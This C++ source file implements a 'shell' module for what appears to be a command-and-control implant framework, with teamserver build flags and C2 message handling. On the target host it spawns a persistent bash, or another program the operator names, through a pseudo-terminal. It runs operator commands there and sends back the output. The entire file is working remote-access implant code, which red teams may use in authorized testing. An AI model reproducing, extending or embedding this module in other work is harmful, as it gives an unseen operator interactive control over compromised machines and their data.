#include "Shell.hpp"
#include "Common.hpp"

#include <cstring>
#include <pty.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/wait.h>

using namespace std;

constexpr std::string_view moduleName = "shell";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) Shell* ShellConstructor()
{
    return new Shell();
}
#else
__attribute__((visibility("default"))) Shell* ShellConstructor()
{
    return new Shell();
}
#endif

Shell::Shell()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
    m_masterFd = -1;
    m_pid = -1;
    m_started = false;
    m_program = "/bin/bash";
}

Shell::~Shell()
{
    stopShell();
}

std::string Shell::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "shell:\n";
    info += "Launch an interactive bash shell that persists across commands.\n";
    info += "Examples:\n";
    info += " - shell            # start shell\n";
    info += " - shell ls -la     # run command\n";
    info += " - shell exit       # stop shell\n";
#endif
    return info;
}

int Shell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::string arg;
    if(splitedCmd.size() > 1)
    {
        for(size_t i = 1; i < splitedCmd.size(); ++i)
        {
            arg += splitedCmd[i];
            if(i + 1 < splitedCmd.size())
                arg += " ";
        }
    }
    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(arg);
#endif
    return 0;
}

int Shell::followUp(const C2Message &c2RetMessage)
{
    return 0;
}

int Shell::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
    return 0;
}

int Shell::startShell()
{
#ifdef __linux__
    if(m_started)
        return 0;

    pid_t pid = forkpty(&m_masterFd, NULL, NULL, NULL);
    if(pid == -1)
        return 1;

    if(pid == 0)
    {
        execlp(m_program.c_str(), m_program.c_str(), (char*)NULL);
        _exit(1);
    }

    m_pid = pid;
    m_started = true;
    return 0;
#else
    return 1;
#endif
}

void Shell::stopShell()
{
#ifdef __linux__
    if(!m_started)
        return;

    write(m_masterFd, "exit\n", 5);
    int status = 0;
    waitpid(m_pid, &status, 0);
    close(m_masterFd);
    m_masterFd = -1;
    m_pid = -1;
    m_started = false;
#endif
}

int Shell::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string cmd = c2Message.cmd();

#ifdef __linux__
    if(!m_started)
    {
        if(!cmd.empty())
            m_program = cmd;
        if(startShell() != 0)
        {
            c2RetMessage.set_errorCode(1);
            return 0;
        }
        if(cmd.empty())
        {
            c2RetMessage.set_instruction(c2Message.instruction());
            c2RetMessage.set_returnvalue("shell started");
            return 0;
        }
    }

    if(cmd == "exit")
    {
        stopShell();
        c2RetMessage.set_instruction(c2Message.instruction());
        c2RetMessage.set_returnvalue("shell terminated");
        return 0;
    }

    // send command
    if(!cmd.empty())
    {
        write(m_masterFd, cmd.c_str(), cmd.size());
        write(m_masterFd, "\n", 1);
    }

    // read output with timeout
    std::string output;
    fd_set fds;
    struct timeval tv;
    char buffer[512];
    while(true)
    {
        FD_ZERO(&fds);
        FD_SET(m_masterFd, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 200000; // 200ms

        int r = select(m_masterFd+1, &fds, NULL, NULL, &tv);
        if(r > 0 && FD_ISSET(m_masterFd, &fds))
        {
            ssize_t n = read(m_masterFd, buffer, sizeof(buffer));
            if(n > 0)
                output.append(buffer, n);
        }
        else
        {
            break;
        }
    }

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(output);
#else
    c2RetMessage.set_errorCode(1);
#endif
    return 0;
}
